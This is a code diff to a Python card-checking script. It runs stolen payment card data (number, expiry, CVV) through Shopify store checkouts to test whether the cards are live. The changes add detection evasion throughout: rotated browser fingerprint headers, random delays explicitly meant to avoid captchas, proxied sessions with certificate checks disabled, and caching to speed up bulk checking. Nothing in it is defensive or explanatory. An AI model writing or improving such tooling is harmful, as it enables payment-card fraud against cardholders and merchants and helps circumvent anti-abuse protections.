@@ -7,6 +7,8 @@ import time
 import re
 import urllib3
 import random
+from requests.adapters import HTTPAdapter
+from urllib3.util.retry import Retry
 
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
@@ -15,6 +17,10 @@ retry_count = 0
 
 # Initialize UserAgent generator
 ua_generator = UserAgent()
+
+# Product cache to avoid repeated lookups for same site (limited to 50 entries)
+product_cache = {}
+PRODUCT_CACHE_MAX_SIZE = 50
 
 # List of Accept-Language headers for rotation
 ACCEPT_LANGUAGES = [
@@ -27,6 +33,21 @@ ACCEPT_LANGUAGES = [
     'en-AU,en;q=0.9',
 ]
 
+# Sec-CH-UA variants for fingerprint rotation (valid Chrome brand syntax)
+SEC_CH_UA_VARIANTS = [
+    '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
+    '"Chromium";v="127", "Not A;Brand";v="99", "Google Chrome";v="127"',
+    '"Chromium";v="126", "Not;A Brand";v="8", "Google Chrome";v="126"',
+    '"Chromium";v="125", "Not=A;Brand";v="24", "Google Chrome";v="125"',
+    '"Chromium";v="124", "Not A;Brand";v="99", "Google Chrome";v="124"',
+]
+
+SEC_CH_UA_PLATFORMS = [
+    '"Windows"',
+    '"macOS"',
+    '"Linux"',
+]
+
 def get_random_ua():
     """Get a random Chrome User-Agent for each request"""
     try:
@@ -37,6 +58,62 @@ def get_random_ua():
 def get_random_accept_language():
     """Get a random Accept-Language header"""
     return random.choice(ACCEPT_LANGUAGES)
+
+def get_random_sec_ch_ua():
+    """Get random Sec-CH-UA header"""
+    return random.choice(SEC_CH_UA_VARIANTS)
+
+def get_random_platform():
+    """Get random platform"""
+    return random.choice(SEC_CH_UA_PLATFORMS)
+
+def random_delay(min_delay=0.3, max_delay=1.5):
+    """Add random delay between requests to reduce captcha"""
+    delay = random.uniform(min_delay, max_delay)
+    time.sleep(delay)
+
+def create_session(proxy=None):
+    """Create a requests session with connection pooling and retry logic"""
+    session = requests.Session()
+    
+    retry_strategy = Retry(
+        total=3,
+        backoff_factor=0.5,
+        status_forcelist=[429, 500, 502, 503, 504],
+    )
+    
+    adapter = HTTPAdapter(
+        max_retries=retry_strategy,
+        pool_connections=10,
+        pool_maxsize=10
+    )
+    
+    session.mount("http://", adapter)
+    session.mount("https://", adapter)
+    
+    if proxy:
+        session.proxies = proxy
+    
+    session.verify = False
+    
+    return session
+
+def get_base_headers(referer=None):
+    """Get realistic browser headers with fingerprint rotation"""
+    headers = {
+        'User-Agent': get_random_ua(),
+        'Accept-Language': get_random_accept_language(),
+        'Cache-Control': 'no-cache',
+        'Pragma': 'no-cache',
+        'DNT': '1',
+        'Sec-GPC': '1',
+        'Sec-CH-UA': get_random_sec_ch_ua(),
+        'Sec-CH-UA-Mobile': '?0',
+        'Sec-CH-UA-Platform': get_random_platform(),
+    }
+    if referer:
+        headers['Referer'] = referer
+    return headers
 
 def find_between(content, start, end):
     try:
@@ -62,19 +139,33 @@ def get_proxy(proxy_string):
         }
     return None
 
-def make_request_with_proxy(url, method='GET', headers=None, json_data=None, data=None, cookies=None, timeout=90, proxy=None):
+def make_request_with_proxy(url, method='GET', headers=None, json_data=None, data=None, cookies=None, timeout=60, proxy=None, session=None, add_delay=True):
     global retry_count
     global max_retries
+    
+    # Add random delay before request to reduce captcha detection
+    if add_delay:
+        random_delay(0.3, 1.2)
+    
+    # Use session if provided, otherwise use requests directly
+    requester = session if session else requests
     
     for attempt in range(max_retries):
         try:
             if method.upper() == 'GET':
-                response = requests.get(url, headers=headers, proxies=proxy, 
-                                      verify=False, timeout=timeout, cookies=cookies)
+                if session:
+                    response = session.get(url, headers=headers, timeout=timeout, cookies=cookies)
+                else:
+                    response = requests.get(url, headers=headers, proxies=proxy, 
+                                          verify=False, timeout=timeout, cookies=cookies)
             elif method.upper() == 'POST':
-                response = requests.post(url, headers=headers, json=json_data, 
-                                       data=data, proxies=proxy, verify=False, 
-                                       timeout=timeout, cookies=cookies)
+                if session:
+                    response = session.post(url, headers=headers, json=json_data, 
+                                           data=data, timeout=timeout, cookies=cookies)
+                else:
+                    response = requests.post(url, headers=headers, json=json_data, 
+                                           data=data, proxies=proxy, verify=False, 
+                                           timeout=timeout, cookies=cookies)
             else:
                 raise ValueError(f"Unsupported HTTP method: {method}")
             
@@ -84,14 +175,14 @@ def make_request_with_proxy(url, method='GET', headers=None, json_data=None, dat
         except (requests.exceptions.ConnectionError, requests.exceptions.Timeout, requests.exceptions.ChunkedEncodingError) as e:
             retry_count += 1
             print(f"[Retry {retry_count}/{max_retries}] Network error for {url}: {e}", file=sys.stderr)
-            time.sleep(2)
+            time.sleep(1.5)
             if attempt == max_retries - 1:
                 raise Exception(f"Failed after {max_retries} attempts: {e}")
         except requests.exceptions.HTTPError as e:
             if e.response.status_code in [429, 500, 502, 503, 504]:
                 retry_count += 1
                 print(f"[Retry {retry_count}/{max_retries}] HTTP {e.response.status_code} for {url}", file=sys.stderr)
-                time.sleep(3)
+                time.sleep(2)
                 continue
             raise e
         except Exception as e:
@@ -141,6 +232,7 @@ def get_address_details(country_code):
 def check_card(card_data, site_input, proxy_string=""):
     global retry_count
     global max_retries
+    global product_cache
     
     parts = card_data.split('|')
     if len(parts) < 4:
@@ -156,8 +248,6 @@ def check_card(card_data, site_input, proxy_string=""):
     
     sub_month = str(int(month))
     
-    proxy = get_proxy(proxy_string)
-    
     if not site_input.startswith(('http://', 'https://')):
         site_input = 'https://' + site_input
     
@@ -165,53 +255,81 @@ def check_card(card_data, site_input, proxy_string=""):
     if not parsed_url.scheme or not parsed_url.netloc:
         return {'status': 'dead', 'message': 'Invalid Site URL'}
     
+    proxy = get_proxy(proxy_string)
+    
+    # Create session for connection reuse
+    session = create_session(proxy)
+    
+    try:
+        result = _check_card_with_session(session, cc, month, year, cvv, sub_month, site_input, parsed_url)
+        return result
+    finally:
+        session.close()
+
+def _check_card_with_session(session, cc, month, year, cvv, sub_month, site_input, parsed_url):
+    """Internal function to perform card check with provided session"""
+    global retry_count
+    global max_retries
+    global product_cache
+    
     base_url = f"{parsed_url.scheme}://{parsed_url.netloc}"
     domain = parsed_url.hostname
     products_url = f"{base_url}/products.json"
     
-    headers = {
-        'User-Agent': get_random_ua(),
-        'Accept': 'application/json',
-        'Accept-Language': get_random_accept_language(),
-    }
-    
     try:
-        response = make_request_with_proxy(products_url, 'GET', headers=headers, proxy=proxy)
-        
-        def get_minimum_price_product_details(json_data):
-            try:
-                data = json.loads(json_data)
-            except json.JSONDecodeError:
-                raise Exception("Invalid JSON format")
+        # Check product cache first for speed improvement
+        cache_key = base_url
+        if cache_key in product_cache:
+            product_details = product_cache[cache_key]
+            print(f"[LOG] Using cached product: {product_details['title']} | ${product_details['price']}", file=sys.stderr)
+        else:
+            headers = get_base_headers(referer=base_url)
+            headers['Accept'] = 'application/json'
+            
+            response = make_request_with_proxy(products_url, 'GET', headers=headers, session=session, add_delay=False)
+            
+            def get_minimum_price_product_details(json_data):
+                try:
+                    data = json.loads(json_data)
+                except json.JSONDecodeError:
+                    raise Exception("Invalid JSON format")
 
-            if not isinstance(data, dict) or 'products' not in data:
-                raise Exception("Invalid JSON format or missing 'products' key")
+                if not isinstance(data, dict) or 'products' not in data:
+                    raise Exception("Invalid JSON format or missing 'products' key")
 
-            min_price = None
-            min_price_details = {
-                'id': None,
-                'price': None,
-                'title': None
-            }
+                min_price = None
+                min_price_details = {
+                    'id': None,
+                    'price': None,
+                    'title': None
+                }
 
-            for product in data['products']:
-                for variant in product.get('variants', []):
-                    price = float(variant['price'])
-                    if price >= 0.01 and (not variant.get('available') is False):
-                        if min_price is None or price < min_price:
-                            min_price = price
-                            min_price_details = {
-                                'id': variant['id'],
-                                'price': variant['price'],
-                                'title': product['title']
-                            }
+                for product in data['products']:
+                    for variant in product.get('variants', []):
+                        price = float(variant['price'])
+                        if price >= 0.01 and (not variant.get('available') is False):
+                            if min_price is None or price < min_price:
+                                min_price = price
+                                min_price_details = {
+                                    'id': variant['id'],
+                                    'price': variant['price'],
+                                    'title': product['title']
+                                }
 
-            if min_price is None:
-                raise Exception("No products found with price greater than or equal to 0.01")
+                if min_price is None:
+                    raise Exception("No products found with price greater than or equal to 0.01")
 
-            return min_price_details
+                return min_price_details
 
-        product_details = get_minimum_price_product_details(response.text)
+            product_details = get_minimum_price_product_details(response.text)
+            
+            # Cache the product for future checks on same site (with size limit)
+            if len(product_cache) >= PRODUCT_CACHE_MAX_SIZE:
+                # Remove oldest entry (first key)
+                oldest_key = next(iter(product_cache))
+                del product_cache[oldest_key]
+            product_cache[cache_key] = product_details
+            print(f"[LOG] Product: {product_details['title']} | ${product_details['price']}", file=sys.stderr)
 
         min_price_product_id = product_details['id']
         min_price = product_details['price']
@@ -219,8 +337,6 @@ def check_card(card_data, site_input, proxy_string=""):
 
         if not min_price_product_id:
             raise Exception('Product id is empty')
-
-        print(f"[LOG] Product: {product_title} | ${min_price}", file=sys.stderr)
 
     except Exception as e:
         return {'status': 'dead', 'message': 'Invalid Response'}
@@ -232,23 +348,19 @@ def check_card(card_data, site_input, proxy_string=""):
     retry_count = 0
     while retry_count < max_retries:
         try:
-            headers = {
-                'User-Agent': get_random_ua(),
+            headers = get_base_headers(referer=base_url)
+            headers.update({
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-                'Accept-Language': get_random_accept_language(),
                 'Priority': 'u=0, i',
-                'Sec-CH-UA': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
-                'Sec-CH-UA-Mobile': '?0',
-                'Sec-CH-UA-Platform': '"Windows"',
                 'Sec-Fetch-Dest': 'document',
                 'Sec-Fetch-Mode': 'navigate',
                 'Sec-Fetch-Site': 'none',
                 'Sec-Fetch-User': '?1',
                 'Upgrade-Insecure-Requests': '1',
-            }
+            })
             
             response = make_request_with_proxy(cart_url, 'GET', headers=headers, 
-                                             cookies={'cookie': cookie}, proxy=proxy)
+                                             cookies={'cookie': cookie}, session=session)
 
             country_code_match = re.search(r'"supportedCountries":\["([^"]+)"\]', response.text)
             if not country_code_match:
@@ -311,7 +423,7 @@ def check_card(card_data, site_input, proxy_string=""):
             }
 
             response = make_request_with_proxy("https://deposit.shopifycs.com/sessions", 
-                                             'POST', headers=token_headers, json_data=payload, proxy=proxy)
+                                             'POST', headers=token_headers, json_data=payload, session=session)
 
             response2js = response.json()
             cctoken = response2js.get('id')
@@ -501,7 +613,7 @@ def check_card(card_data, site_input, proxy_string=""):
             'POST',
             headers=headers,
             json_data=propayload,
-            proxy=proxy
+            session=session
         )
 
         if response.status_code != 200:
@@ -803,7 +915,7 @@ def check_card(card_data, site_input, proxy_string=""):
                 'POST',
                 headers=headers,
                 json_data=payload,
-                proxy=proxy
+                session=session
             )
             
             response_text = response.text
@@ -856,7 +968,7 @@ def check_card(card_data, site_input, proxy_string=""):
                 'POST',
                 headers=phead,
                 json_data=pload,
-                proxy=proxy
+                session=session
             )
 
             response_json = response.json()
